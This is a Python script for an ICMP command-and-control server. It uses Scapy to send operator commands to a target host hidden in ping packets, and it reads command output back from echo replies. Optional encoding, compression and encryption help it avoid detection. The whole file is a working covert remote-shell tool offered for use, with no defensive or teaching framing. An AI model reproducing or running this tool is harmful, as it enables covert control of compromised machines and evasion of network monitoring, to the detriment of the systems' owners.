#!/usr/bin/env python3
"""
ICMP C2 Command Server - Enhanced version with more options and better functionality
"""
from scapy.all import sr, IP, ICMP, Raw, sniff, conf
from multiprocessing import Process, Event
import argparse
import sys
import base64
import zlib
import time
import threading
from cryptography.fernet import Fernet

# Disable Scapy's verbose mode
conf.verb = 0

# Default variables
DEFAULT_ICMP_ID = 13170
DEFAULT_TTL = 64
DEFAULT_TIMEOUT = 5
DEFAULT_CHUNK_SIZE = 500  # bytes

def check_scapy():
    """Verify Scapy is available"""
    try:
        from scapy.all import sr, IP, ICMP, Raw, sniff
    except ImportError:
        print("Install the Py3 scapy module: pip install scapy")
        sys.exit(1)

def check_cryptography():
    """Verify cryptography is available for encryption"""
    try:
        from cryptography.fernet import Fernet
        return True
    except ImportError:
        print("Warning: Install cryptography for encryption: pip install cryptography")
        return False

def encode_data(data, encoding="plain", compression=False):
    """Encode data based on selected method"""
    if encoding == "base64":
        data = base64.b64encode(data.encode()).decode()
    elif encoding == "hex":
        data = data.encode().hex()
    
    if compression:
        data = base64.b64encode(zlib.compress(data.encode())).decode()
    
    return data

def decode_data(data, encoding="plain", compression=False):
    """Decode data based on selected method"""
    if compression:
        try:
            data = zlib.decompress(base64.b64decode(data)).decode()
        except:
            # If decompression fails, try without
            pass
    
    if encoding == "base64":
        data = base64.b64decode(data).decode(errors='ignore')
    elif encoding == "hex":
        data = bytes.fromhex(data).decode(errors='ignore')
    
    return data

class ICMPShell:
    def __init__(self, args):
        self.args = args
        self.icmp_id = args.icmp_id
        self.running = Event()
        self.running.set()
        self.sequence_num = 0
        self.encryption_enabled = False
        
        # Setup encryption if requested and available
        if args.encrypt and check_cryptography():
            if args.key:
                try:
                    self.cipher = Fernet(args.key.encode())
                    self.encryption_enabled = True
                    print("[+] Encryption enabled")
                except:
                    print("[-] Invalid key format, using plaintext")
            else:
                print("[-] Encryption requested but no key provided")
        
        # Validate chunk size
        if args.chunk_size > 1000:
            print("[-] Chunk size too large, setting to 1000")
            args.chunk_size = 1000
    
    def encrypt_data(self, data):
        """Encrypt data if encryption is enabled"""
        if self.encryption_enabled:
            return self.cipher.encrypt(data.encode()).decode('latin-1')
        return data
    
    def decrypt_data(self, data):
        """Decrypt data if encryption is enabled"""
        if self.encryption_enabled:
            try:
                return self.cipher.decrypt(data.encode('latin-1')).decode()
            except:
                return f"[DECRYPTION ERROR] {data}"
        return data
    
    def send_command(self, command):
        """Send command to the target in chunks"""
        # Encode and encrypt the command
        encoded_cmd = encode_data(command, self.args.encoding, self.args.compress)
        encrypted_cmd = self.encrypt_data(encoded_cmd)
        
        # Split into chunks if needed
        chunks = [encrypted_cmd[i:i+self.args.chunk_size] 
                 for i in range(0, len(encrypted_cmd), self.args.chunk_size)]
        
        # Send each chunk
        for i, chunk in enumerate(chunks):
            payload = (IP(dst=self.args.destination_ip, ttl=self.args.ttl)/
                      ICMP(type=8, id=self.icmp_id, seq=self.sequence_num)/
                      Raw(load=f"{i}:{len(chunks)}:{chunk}"))
            
            try:
                sr(payload, timeout=self.args.timeout, verbose=0)
                self.sequence_num = (self.sequence_num + 1) % 65535
                time.sleep(0.1)  # Small delay between packets
            except Exception as e:
                print(f"[-] Error sending packet: {e}")
    
    def sniffer(self):
        """Sniff for ICMP responses"""
        def process_packet(pkt):
            if (pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw) and
                pkt[IP].src == self.args.destination_ip and 
                pkt[ICMP].type == 0 and 
                pkt[ICMP].id == self.icmp_id):
                
                try:
                    # Extract and process the data
                    raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')
                    
                    # Handle chunked responses if needed
                    if ':' in raw_data:
                        parts = raw_data.split(':', 2)
                        if len(parts) == 3:
                            chunk_num, total_chunks, data = parts
                            # In a real implementation, you'd reassemble chunks
                            # For simplicity, we'll just print each chunk
                            decrypted_data = self.decrypt_data(data)
                            decoded_data = decode_data(decrypted_data, self.args.encoding, self.args.compress)
                            print(decoded_data, end='', flush=True)
                    else:
                        decrypted_data = self.decrypt_data(raw_data)
                        decoded_data = decode_data(decrypted_data, self.args.encoding, self.args.compress)
                        print(decoded_data, end='', flush=True)
                        
                except Exception as e:
                    print(f"[-] Error processing packet: {e}")
        
        # Start sniffing
        sniff(iface=self.args.interface, prn=process_packet, 
              filter="icmp", store=0, stop_filter=lambda x: not self.running.is_set())
    
    def start(self):
        """Start the ICMP C2 Command Server"""
        print(f"[+] ICMP C2 Command Server started on {self.args.interface}")
        print(f"[+] Targeting {self.args.destination_ip}")
        print(f"[+] ICMP ID: {self.icmp_id}")
        if self.encryption_enabled:
            print("[+] Encryption: Enabled")
        else:
            print("[+] Encryption: Disabled")
        print("[+] Type 'exit' to quit, 'help' for commands")
        
        # Start the sniffer in a separate process
        sniffer_process = Process(target=self.sniffer)
        sniffer_process.start()
        
        try:
            while self.running.is_set():
                try:
                    command = input("shell> ").strip()
                    
                    if command.lower() == 'exit':
                        print("[+] Stopping ICMP C2...")
                        self.running.clear()
                        break
                    elif command.lower() == 'help':
                        self.show_help()
                    elif command == '':
                        continue
                    else:
                        self.send_command(command)
                        
                except KeyboardInterrupt:
                    print("\n[+] Stopping ICMP C2...")
                    self.running.clear()
                    break
                except EOFError:
                    print("\n[+] Exiting...")
                    self.running.clear()
                    break
                    
        finally:
            self.running.clear()
            sniffer_process.terminate()
            sniffer_process.join()
    
    def show_help(self):
        """Show available commands"""
        help_text = """
Available commands:
  exit          - Exit the C2 Command
  help          - Show this help
  <any command> - Execute command on target

Options in use:
  Interface:    {interface}
  Target IP:    {target_ip}
  ICMP ID:      {icmp_id}
  Encoding:     {encoding}
  Compression:  {compression}
  Encryption:   {encryption}
  Chunk Size:   {chunk_size}
        """.format(
            interface=self.args.interface,
            target_ip=self.args.destination_ip,
            icmp_id=self.icmp_id,
            encoding=self.args.encoding,
            compression="Enabled" if self.args.compress else "Disabled",
            encryption="Enabled" if self.encryption_enabled else "Disabled",
            chunk_size=self.args.chunk_size
        )
        print(help_text)

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 Client")
    parser.add_argument('-i', '--interface', type=str, required=True, 
                       help="Listener (virtual) Network Interface (e.g. eth0)")
    parser.add_argument('-d', '--destination_ip', type=str, required=True, 
                       help="Destination IP address")
    parser.add_argument('--icmp-id', type=int, default=DEFAULT_ICMP_ID,
                       help=f"ICMP ID (default: {DEFAULT_ICMP_ID})")
    parser.add_argument('--ttl', type=int, default=DEFAULT_TTL,
                       help=f"IP TTL (default: {DEFAULT_TTL})")
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT,
                       help=f"Response timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument('--encoding', choices=['plain', 'base64', 'hex'], default='plain',
                       help="Data encoding method (default: plain)")
    parser.add_argument('--compress', action='store_true',
                       help="Enable compression")
    parser.add_argument('--encrypt', action='store_true',
                       help="Enable encryption (requires --key)")
    parser.add_argument('--key', type=str,
                       help="Encryption key (required if --encrypt is used)")
    parser.add_argument('--chunk-size', type=int, default=DEFAULT_CHUNK_SIZE,
                       help=f"Maximum chunk size in bytes (default: {DEFAULT_CHUNK_SIZE})")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.encrypt and not args.key:
        parser.error("--encrypt requires --key")
    
    # Check dependencies
    check_scapy()
    
    # Start the ICMP shell
    shell = ICMPShell(args)
    shell.start()

if __name__ == "__main__":
    main()
